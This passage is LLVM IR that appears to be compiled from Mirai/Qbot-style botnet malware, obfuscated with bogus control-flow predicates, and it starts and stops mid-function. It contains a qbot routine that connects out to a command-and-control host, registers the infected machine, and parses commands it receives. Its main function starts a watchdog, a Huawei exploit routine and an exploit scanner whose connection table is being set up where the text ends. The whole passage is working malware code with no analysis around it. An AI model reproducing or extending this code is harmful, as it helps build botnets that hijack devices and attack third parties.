  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [11 x i8*], align 16
  %14 = alloca i8*, align 8
  store i8* %0, i8** %10, align 8
  store i32 0, i32* %12, align 4
  %15 = bitcast [11 x i8*]* %13 to i8*
  call void @llvm.memset.p0i8.i64(i8* %15, i8 0, i64 88, i32 16, i1 false)
  %16 = load i8*, i8** %10, align 8
  %17 = call i8* @strtok(i8* %16, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0)) #6
  store i8* %17, i8** %14, align 8
  %18 = load i32, i32* @x.43
  %19 = load i32, i32* @y.44
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart220, %originalBBpart2
  %27 = load i8*, i8** %14, align 8
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %32

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* %12, align 4
  %31 = icmp slt i32 %30, 10
  br label %32

; <label>:32:                                     ; preds = %29, %26
  %33 = phi i1 [ false, %26 ], [ %31, %29 ]
  br i1 %33, label %34, label %67

; <label>:34:                                     ; preds = %32
  %35 = load i32, i32* @x.43
  %36 = load i32, i32* @y.44
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load i8*, i8** %14, align 8
  %44 = call i64 @strlen(i8* %43) #10
  %45 = add i64 %44, 1
  %46 = call noalias i8* @malloc(i64 %45) #6
  %47 = load i32, i32* %12, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %12, align 4
  %49 = sext i32 %47 to i64
  %50 = getelementptr inbounds [11 x i8*], [11 x i8*]* %13, i64 0, i64 %49
  store i8* %46, i8** %50, align 8
  %51 = load i32, i32* %12, align 4
  %52 = sub nsw i32 %51, 1
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [11 x i8*], [11 x i8*]* %13, i64 0, i64 %53
  %55 = load i8*, i8** %54, align 8
  %56 = load i8*, i8** %14, align 8
  %57 = call i8* @strcpy(i8* %55, i8* %56) #6
  %58 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0)) #6
  store i8* %58, i8** %14, align 8
  %59 = load i32, i32* @x.43
  %60 = load i32, i32* @y.44
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart220, label %originalBB1alteredBB

originalBBpart220:                                ; preds = %originalBB1
  br label %26

; <label>:67:                                     ; preds = %32
  %68 = load i32, i32* %12, align 4
  %69 = icmp sgt i32 %68, 0
  br i1 %69, label %70, label %89

; <label>:70:                                     ; preds = %67
  %71 = load i32, i32* @x.43
  %72 = load i32, i32* @y.44
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %70
  %79 = load i32, i32* %12, align 4
  %80 = getelementptr inbounds [11 x i8*], [11 x i8*]* %13, i32 0, i32 0
  call void @proc_cmd(i32 %79, i8** %80)
  %81 = load i32, i32* @x.43
  %82 = load i32, i32* @y.44
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %89

; <label>:89:                                     ; preds = %originalBBpart224, %67
  store i32 0, i32* %11, align 4
  br label %90

; <label>:90:                                     ; preds = %originalBBpart237, %89
  %91 = load i32, i32* %11, align 4
  %92 = load i32, i32* %12, align 4
  %93 = icmp slt i32 %91, %92
  br i1 %93, label %94, label %118

; <label>:94:                                     ; preds = %90
  %95 = load i32, i32* %11, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds [11 x i8*], [11 x i8*]* %13, i64 0, i64 %96
  %98 = load i8*, i8** %97, align 8
  call void @free(i8* %98) #6
  br label %99

; <label>:99:                                     ; preds = %94
  %100 = load i32, i32* @x.43
  %101 = load i32, i32* @y.44
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %99
  %108 = load i32, i32* %11, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %11, align 4
  %110 = load i32, i32* @x.43
  %111 = load i32, i32* @y.44
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart237, label %originalBB26alteredBB

originalBBpart237:                                ; preds = %originalBB26
  br label %90

; <label>:118:                                    ; preds = %90
  %119 = load i32, i32* @x.43
  %120 = load i32, i32* @y.44
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %118
  %127 = load i32, i32* @x.43
  %128 = load i32, i32* @y.44
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %135 = alloca i8*, align 8
  %136 = alloca i32, align 4
  %137 = alloca i32, align 4
  %138 = alloca [11 x i8*], align 16
  %139 = alloca i8*, align 8
  store i8* %0, i8** %135, align 8
  store i32 0, i32* %137, align 4
  %140 = bitcast [11 x i8*]* %138 to i8*
  call void @llvm.memset.p0i8.i64(i8* %140, i8 0, i64 88, i32 16, i1 false)
  %141 = load i8*, i8** %135, align 8
  %142 = call i8* @strtok(i8* %141, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0)) #6
  store i8* %142, i8** %139, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  %143 = load i8*, i8** %14, align 8
  %144 = call i64 @strlen(i8* %143) #10
  %_ = shl i64 %144, 1
  %_2 = sub i64 0, %144
  %gen = add i64 %_2, 1
  %_3 = sub i64 %144, 1
  %gen4 = mul i64 %_3, 1
  %_5 = sub i64 0, %144
  %gen6 = add i64 %_5, 1
  %_7 = sub i64 0, %144
  %gen8 = add i64 %_7, 1
  %_9 = shl i64 %144, 1
  %_10 = shl i64 %144, 1
  %145 = add i64 %144, 1
  %146 = call noalias i8* @malloc(i64 %145) #6
  %147 = load i32, i32* %12, align 4
  %_11 = shl i32 %147, 1
  %_12 = sub i32 %147, 1
  %gen13 = mul i32 %_12, 1
  %_14 = shl i32 %147, 1
  %_15 = shl i32 %147, 1
  %148 = add nsw i32 %147, 1
  store i32 %148, i32* %12, align 4
  %149 = sext i32 %147 to i64
  %150 = getelementptr inbounds [11 x i8*], [11 x i8*]* %13, i64 0, i64 %149
  store i8* %146, i8** %150, align 8
  %151 = load i32, i32* %12, align 4
  %_16 = shl i32 %151, 1
  %_17 = sub i32 0, %151
  %gen18 = add i32 %_17, 1
  %152 = sub nsw i32 %151, 1
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds [11 x i8*], [11 x i8*]* %13, i64 0, i64 %153
  %155 = load i8*, i8** %154, align 8
  %156 = load i8*, i8** %14, align 8
  %157 = call i8* @strcpy(i8* %155, i8* %156) #6
  %158 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0)) #6
  store i8* %158, i8** %14, align 8
  br label %originalBB1

originalBB22alteredBB:                            ; preds = %originalBB22, %70
  %159 = load i32, i32* %12, align 4
  %160 = getelementptr inbounds [11 x i8*], [11 x i8*]* %13, i32 0, i32 0
  call void @proc_cmd(i32 %159, i8** %160)
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %99
  %161 = load i32, i32* %11, align 4
  %_27 = sub i32 0, %161
  %gen28 = add i32 %_27, 1
  %_29 = sub i32 %161, 1
  %gen30 = mul i32 %_29, 1
  %_31 = shl i32 %161, 1
  %_32 = sub i32 0, %161
  %gen33 = add i32 %_32, 1
  %_34 = sub i32 %161, 1
  %gen35 = mul i32 %_34, 1
  %162 = add nsw i32 %161, 1
  store i32 %162, i32* %11, align 4
  br label %originalBB26

originalBB39alteredBB:                            ; preds = %originalBB39, %118
  br label %originalBB39
}

; Function Attrs: noinline nounwind uwtable
define void @qbot() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [11 x i8*], align 16
  %4 = call i32 @fork() #6
  %5 = icmp sgt i32 %4, 0
  br i1 %5, label %6, label %23

; <label>:6:                                      ; preds = %0
  %7 = load i32, i32* @x.45
  %8 = load i32, i32* @y.46
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = load i32, i32* @x.45
  %16 = load i32, i32* @y.46
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %187

; <label>:23:                                     ; preds = %0
  %24 = load i32, i32* @x.45
  %25 = load i32, i32* @y.46
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %23
  store i32 0, i32* %2, align 4
  %32 = bitcast [11 x i8*]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %32, i8 0, i64 88, i32 16, i1 false)
  %33 = call i32 @resolve_http()
  %34 = load i32, i32* @x.45
  %35 = load i32, i32* @y.46
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %42

; <label>:42:                                     ; preds = %originalBBpart234, %originalBBpart24
  %43 = load i32, i32* @x.45
  %44 = load i32, i32* @y.46
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %42
  %51 = load i32, i32* @C2, align 4
  %52 = load i32, i32* @C2, align 4
  %53 = call i32 (i32, i32, ...) @fcntl(i32 %52, i32 3, i32 0)
  %54 = or i32 %53, 2048
  %55 = call i32 (i32, i32, ...) @fcntl(i32 %51, i32 4, i32 %54)
  %56 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %56, i32* @C2, align 4
  %57 = icmp eq i32 %56, -1
  %58 = load i32, i32* @x.45
  %59 = load i32, i32* @y.46
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart217, label %originalBB6alteredBB

originalBBpart217:                                ; preds = %originalBB6
  br i1 %57, label %66, label %70

; <label>:66:                                     ; preds = %originalBBpart217
  %67 = load i32, i32* @C2, align 4
  %68 = call i32 @close(i32 %67)
  %69 = call i32 @close(i32 0)
  br label %70

; <label>:70:                                     ; preds = %66, %originalBBpart217
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 0), align 4
  %71 = call i32 @inet_addr(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @c2_host, i32 0, i32 0)) #6
  store i32 %71, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 2, i32 0), align 4
  %72 = load i32, i32* @c2_bot_port, align 4
  %73 = trunc i32 %72 to i16
  %74 = call zeroext i16 @htons(i16 zeroext %73) #9
  store i16 %74, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 1), align 2
  %75 = load i32, i32* @C2, align 4
  %76 = call i32 @connect(i32 %75, %struct.sockaddr* bitcast (%struct.sockaddr_in* @Socket to %struct.sockaddr*), i32 16)
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %127

; <label>:78:                                     ; preds = %70
  %79 = load i32, i32* @retry, align 4
  %80 = icmp eq i32 %79, 3
  br i1 %80, label %81, label %101

; <label>:81:                                     ; preds = %78
  %82 = load i32, i32* @x.45
  %83 = load i32, i32* @y.46
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %81
  %90 = load i32, i32* @C2, align 4
  %91 = call i32 @close(i32 %90)
  %92 = call i32 @close(i32 0)
  %93 = load i32, i32* @x.45
  %94 = load i32, i32* @y.46
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %126

; <label>:101:                                    ; preds = %78
  %102 = load i32, i32* @tryagain, align 4
  %103 = icmp eq i32 %102, 1
  br i1 %103, label %104, label %125

; <label>:104:                                    ; preds = %101
  %105 = load i32, i32* @x.45
  %106 = load i32, i32* @y.46
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %104
  %113 = load i32, i32* @C2, align 4
  %114 = call i32 @close(i32 %113)
  %115 = load i32, i32* @retry, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* @retry, align 4
  %117 = load i32, i32* @x.45
  %118 = load i32, i32* @y.46
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart234, label %originalBB23alteredBB

originalBBpart234:                                ; preds = %originalBB23
  br label %42

; <label>:125:                                    ; preds = %101
  br label %126

; <label>:126:                                    ; preds = %125, %originalBBpart221
  br label %187

; <label>:127:                                    ; preds = %70
  call void @registerme(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.69, i32 0, i32 0))
  br label %128

; <label>:128:                                    ; preds = %183, %127
  %129 = load i32, i32* @x.45
  %130 = load i32, i32* @y.46
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %128
  %137 = load i32, i32* @C2, align 4
  %138 = call i64 @read(i32 %137, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i64 1024)
  %139 = trunc i64 %138 to i32
  store i32 %139, i32* @buffer, align 4
  %140 = icmp ne i32 %139, 0
  %141 = load i32, i32* @x.45
  %142 = load i32, i32* @y.46
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br i1 %140, label %149, label %184

; <label>:149:                                    ; preds = %originalBBpart238
  %150 = load i32, i32* @buffer, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds [1024 x i8], [1024 x i8]* @buf, i64 0, i64 %151
  store i8 0, i8* %152, align 1
  %153 = call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.70, i32 0, i32 0)) #10
  %154 = icmp ne i8* %153, null
  br i1 %154, label %155, label %158

; <label>:155:                                    ; preds = %149
  %156 = load i32, i32* @C2, align 4
  %157 = call i64 @write(i32 %156, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i64 6)
  br label %158

; <label>:158:                                    ; preds = %155, %149
  %159 = call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.72, i32 0, i32 0)) #10
  %160 = icmp ne i8* %159, null
  br i1 %160, label %161, label %162

; <label>:161:                                    ; preds = %158
  br label %184

; <label>:162:                                    ; preds = %158
  %163 = load i32, i32* @x.45
  %164 = load i32, i32* @y.46
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %162
  %171 = load i8*, i8** @trigger, align 8
  %172 = call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i8* %171) #10
  %173 = icmp ne i8* %172, null
  %174 = load i32, i32* @x.45
  %175 = load i32, i32* @y.46
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br i1 %173, label %182, label %183

; <label>:182:                                    ; preds = %originalBBpart242
  call void @parse_buffer(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0))
  br label %183

; <label>:183:                                    ; preds = %182, %originalBBpart242
  br label %128

; <label>:184:                                    ; preds = %161, %originalBBpart238
  %185 = load i32, i32* @C2, align 4
  %186 = call i32 @close(i32 %185)
  call void @exit(i32 0) #12
  unreachable

; <label>:187:                                    ; preds = %126, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %6
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %23
  store i32 0, i32* %2, align 4
  %188 = bitcast [11 x i8*]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %188, i8 0, i64 88, i32 16, i1 false)
  %189 = call i32 @resolve_http()
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %42
  %190 = load i32, i32* @C2, align 4
  %191 = load i32, i32* @C2, align 4
  %192 = call i32 (i32, i32, ...) @fcntl(i32 %191, i32 3, i32 0)
  %_ = sub i32 %192, 2048
  %gen = mul i32 %_, 2048
  %_7 = sub i32 %192, 2048
  %gen8 = mul i32 %_7, 2048
  %_9 = sub i32 %192, 2048
  %gen10 = mul i32 %_9, 2048
  %_11 = sub i32 0, %192
  %gen12 = add i32 %_11, 2048
  %_13 = shl i32 %192, 2048
  %_14 = sub i32 0, %192
  %gen15 = add i32 %_14, 2048
  %193 = or i32 %192, 2048
  %194 = call i32 (i32, i32, ...) @fcntl(i32 %190, i32 4, i32 %193)
  %195 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %195, i32* @C2, align 4
  %196 = icmp eq i32 %195, -1
  br label %originalBB6

originalBB19alteredBB:                            ; preds = %originalBB19, %81
  %197 = load i32, i32* @C2, align 4
  %198 = call i32 @close(i32 %197)
  %199 = call i32 @close(i32 0)
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %104
  %200 = load i32, i32* @C2, align 4
  %201 = call i32 @close(i32 %200)
  %202 = load i32, i32* @retry, align 4
  %_24 = shl i32 %202, 1
  %_25 = sub i32 %202, 1
  %gen26 = mul i32 %_25, 1
  %_27 = sub i32 %202, 1
  %gen28 = mul i32 %_27, 1
  %_29 = sub i32 %202, 1
  %gen30 = mul i32 %_29, 1
  %_31 = shl i32 %202, 1
  %_32 = shl i32 %202, 1
  %203 = add nsw i32 %202, 1
  store i32 %203, i32* @retry, align 4
  br label %originalBB23

originalBB36alteredBB:                            ; preds = %originalBB36, %128
  %204 = load i32, i32* @C2, align 4
  %205 = call i64 @read(i32 %204, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i64 1024)
  %206 = trunc i64 %205 to i32
  store i32 %206, i32* @buffer, align 4
  %207 = icmp ne i32 %206, 0
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %162
  %208 = load i8*, i8** @trigger, align 8
  %209 = call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i32 0, i32 0), i8* %208) #10
  %210 = icmp ne i8* %209, null
  br label %originalBB40
}

declare i32 @fcntl(i32, i32, ...) #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  call void @qbot()
  call void @table_init()
  call void @watchdog_maintain()
  %7 = call i32 @rand() #6
  %8 = srem i32 %7, 1
  store i32 %8, i32* %6, align 4
  %9 = load i32, i32* %6, align 4
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %11, label %12

; <label>:11:                                     ; preds = %2
  call void (...) bitcast (void ()* @huawei_init to void (...)*)()
  br label %33

; <label>:12:                                     ; preds = %2
  %13 = load i32, i32* %6, align 4
  %14 = icmp eq i32 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %12
  call void (...) bitcast (void ()* @exploit_init to void (...)*)()
  br label %16

; <label>:16:                                     ; preds = %15, %12
  %17 = load i32, i32* @x.47
  %18 = load i32, i32* @y.48
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load i32, i32* @x.47
  %26 = load i32, i32* @y.48
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %originalBBpart2, %11
  %34 = load i32, i32* %3, align 4
  ret i32 %34

originalBBalteredBB:                              ; preds = %originalBB, %16
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @exploit_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.anon.0*, align 8
  %5 = alloca %struct.fd_set, align 8
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.exploit_scanner_connection*, align 8
  %8 = alloca %struct.timeval, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.anon.0*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.anon.0*, align 8
  %22 = alloca %struct.exploit_scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %34 = call i32 @fork() #6
  store i32 %34, i32* @exploit_scanner_pid, align 4
  %35 = load i32, i32* @exploit_scanner_pid, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %40, label %37

; <label>:37:                                     ; preds = %0
  %38 = load i32, i32* @exploit_scanner_pid, align 4
  %39 = icmp eq i32 %38, -1
  br i1 %39, label %40, label %57

; <label>:40:                                     ; preds = %37, %0
  %41 = load i32, i32* @x.49
  %42 = load i32, i32* @y.50
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %40
  %49 = load i32, i32* @x.49
  %50 = load i32, i32* @y.50
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

; <label>:57:                                     ; preds = %37
  %58 = call i32 @util_local_addr()
  store i32 %58, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %59 = call i64 @time(i64* null) #6
  %60 = trunc i64 %59 to i32
  store i32 %60, i32* @exploit_fake_time, align 4
  %61 = call noalias i8* @calloc(i64 128, i64 5416) #6
  %62 = bitcast i8* %61 to %struct.exploit_scanner_connection*
  store %struct.exploit_scanner_connection* %62, %struct.exploit_scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %63

; <label>:63:                                     ; preds = %77, %57
  %64 = load i32, i32* %1, align 4
  %65 = icmp slt i32 %64, 128
  br i1 %65, label %66, label %80

; <label>:66:                                     ; preds = %63
  %67 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %68 = load i32, i32* %1, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %67, i64 %69
  %71 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %70, i32 0, i32 2
  store i32 0, i32* %71, align 8
  %72 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %73 = load i32, i32* %1, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %72, i64 %74
  %76 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %75, i32 0, i32 0
  store i32 -1, i32* %76, align 8
  br label %77

; <label>:77:                                     ; preds = %66
  %78 = load i32, i32* %1, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %1, align 4
  br label %63

; <label>:80:                                     ; preds = %63
  %81 = load i32, i32* @x.49
  %82 = load i32, i32* @y.50
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
